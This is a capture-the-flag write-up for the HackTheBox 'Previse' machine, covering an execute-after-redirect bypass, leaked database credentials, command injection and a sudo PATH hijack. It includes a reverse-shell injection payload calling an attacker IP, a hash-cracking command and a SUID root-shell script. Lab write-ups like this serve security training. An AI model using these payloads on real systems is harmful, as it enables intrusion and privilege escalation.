---
title: "Previse"
date: 2021-08-09
type: docs
tags:
  - htb
  - linux
  - easy
  - broken-access-control
  - exec-after-redirect
  - command-injection
  - php
  - hashcat
  - sudo
  - path-hijack
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2021-08-09, **IP:** `10.10.11.104` , `previse.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. PHP site. Every page redirects to `login.php`, but the pages **render their body before sending the redirect** (execute-after-redirect). Intercept `accounts.php`, drop the `302`, and create an account.
2. Logged in, `files.php` offers a **site backup** (`siteBackup.zip`). `config.php` inside it leaks the MySQL root password `mySQL_p@ssw0rd!:)`.
3. `logs.php` puts the `delim` POST field straight into `exec("/usr/bin/python /opt/scripts/log_process.py {delim}")`. **Command injection** gives a shell as `www-data`.
4. Log into MySQL, dump `accounts`, crack `m4lwhere`'s MD5crypt hash, and SSH in.
5. `m4lwhere` may `sudo /opt/scripts/access_backup.sh`, which calls `gzip` and `date` with no absolute path. **PATH hijack** gives root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `config.php` (MySQL root) | `mySQL_p@ssw0rd!:)` |
| `m4lwhere` (cracked from `accounts`) | `ilovecody112235!` |
| `user.txt` | `/home/m4lwhere/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Previse is three separate classic bugs stacked on top of each other. The foothold is **execute-after-redirect (EAR)**, sometimes called "silent redirect", where the server does all its work and prints the page, then appends a `Location:` header, so the sensitive content is right there in the response body if you just ignore the redirect. Then a **backup archive** hands you source code and a DB password, the source review shows an obvious **command injection**, and root is a **`sudo` script with a relative binary name** that you hijack via `PATH`. It is a very "read the source, then abuse it" box and a good one for practising response interception in Burp.

Related broken-access-control boxes: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Dog](/writeups/hackthebox/linux/easy/dog/). Related command injection: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/). Related PATH hijack privesc: [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/).

---

## Full Walkthrough

### Enumeration

```console
Open 10.129.174.120:22
Open 10.129.174.120:80
```

```console
[15:09:20] 302 -    3KB - /index.php  ->  login.php
[15:09:21] 200 -    0B  - /config.php
[15:09:21] 200 -    1KB - /nav.php
[15:09:40] 302 -    4KB - /accounts.php  ->  login.php
[15:09:40] 302 -    5KB - /files.php  ->  login.php
```

Two things stand out. `/nav.php` returns `200` with a full navigation menu (accounts, files, logs), and `/accounts.php` returns a `302` **with a 4 KB body**. A redirect with a large body is the tell for EAR.

when we visit `/nav.php` it appears that we are looking at the menu of a logged-in user, with links for "accounts, home, files" and so on.

### Create an account (execute-after-redirect)

we intercepted the request for the accounts page, changed the response to `200 OK`, and we are shown the "add account" form. Submit it to create a user.

<div class="callout callout-note">

**Execute-after-redirect / silent redirect**

`accounts.php` checks the session, and if you are not logged in it *still* runs the rest of the script (renders the form, and on POST actually creates the account) before calling `header("Location: login.php")`. PHP does not stop executing when you send a header unless you `exit;` right after. So in Burp you either drop the `302` response and keep the body, or send the account-creation `POST` directly and ignore the redirect entirely. The `nav.php` `200` was the hint that authorisation is not enforced consistently.

</div>

Log in with the new account.

### Site backup, source and DB creds

in the files tab we can download the site backup, and inside it `config.php` has credentials:

```php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
```

`logs.php` has the injectable line:

```php
// I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

### Command injection to www-data

The "Log Data" download feature POSTs `delim=comma` (or `space`). The value is not sanitised:

```http
POST /logs.php HTTP/1.1
Host: previse.htb
Cookie: PHPSESSID=<your session>
Content-Type: application/x-www-form-urlencoded

delim=comma;+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/9001+0>%261'
```

<div class="callout callout-note">

**Why the semicolon works**

`exec()` runs the string through `/bin/sh -c`, so shell metacharacters are live. `delim=comma; <command>` runs the log script harmlessly, then runs your command. The response echoes `$output`, so even blind-unfriendly payloads like `; id` return data inline. Start a listener and catch the shell as `www-data`.

</div>

### www-data to m4lwhere

```bash
mysql -u root -p'mySQL_p@ssw0rd!:)' previse -e "SELECT username,password FROM accounts"
```

```console
+----------+------------------------------------+
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
+----------+------------------------------------+
```

`$1$` is **MD5crypt**, hashcat mode `500`:

```bash
hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
# -> ilovecody112235!
ssh m4lwhere@previse.htb
```

### Privilege Escalation, PATH hijack

```console
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

```bash
#!/bin/bash
gzip -c /var/www/file_access.log > /var/backups/$(date +%F)_file_access.gz
gzip -c /var/www/file_server.log > /var/backups/$(date +%F)_file_server.gz
```

<div class="callout callout-note">

**Relative binary name in a root script**

`access_backup.sh` calls `gzip` and `date` by name, not by absolute path, and `sudo` here does not reset `PATH` to a safe value (no `secure_path` covering this, or the script does not set its own). So you prepend a writable directory to `PATH`, drop a malicious `gzip` there, and run the `sudo` script. Your `gzip` executes as root.

</div>

```bash
cd /tmp
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > gzip
chmod +x gzip
sudo PATH=/tmp:$PATH /opt/scripts/access_backup.sh
/tmp/rootbash -p
# id -> euid=0
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/m4lwhere/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **`exit;` / `die();` after every `header("Location: ...")`.** A redirect is not access control if the script keeps running.
- **Do not ship backup archives from the web root.** `siteBackup.zip` gave away the whole source tree and a live DB password.
- **Never build shell commands with user input.** Use `escapeshellarg()` at minimum, or better, call the Python script with a fixed argument set.
- **Absolute paths in privileged scripts**, and set `PATH` explicitly at the top of any script that runs as root.
- **Enable `Defaults secure_path`** in sudoers and avoid `env_keep` for `PATH`.

---

## Related Writeups

- **Broken access control / auth bypass:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Dog](/writeups/hackthebox/linux/easy/dog/)
- **Command injection via unsanitised parameter:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Headless](/writeups/hackthebox/linux/medium/headless/)
- **PATH hijack on a `sudo` script:** [Magic](/writeups/hackthebox/linux/medium/magic/), [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Plotted-TMS-v3](/writeups/tryhackme/linux/easy/plotted-tms-v3/)
- **Source + creds from a backup archive:** [Previse](/writeups/hackthebox/linux/easy/previse/), see also [Cat](/writeups/hackthebox/linux/medium/cat/) / [Blocky](/writeups/hackthebox/linux/easy/blocky/)

## References

- CWE-698 Execution After Redirect <https://cwe.mitre.org/data/definitions/698.html>
- GTFOBins on PATH abuse <https://gtfobins.github.io/>
- hashcat example hashes <https://hashcat.net/wiki/doku.php?id=example_hashes>
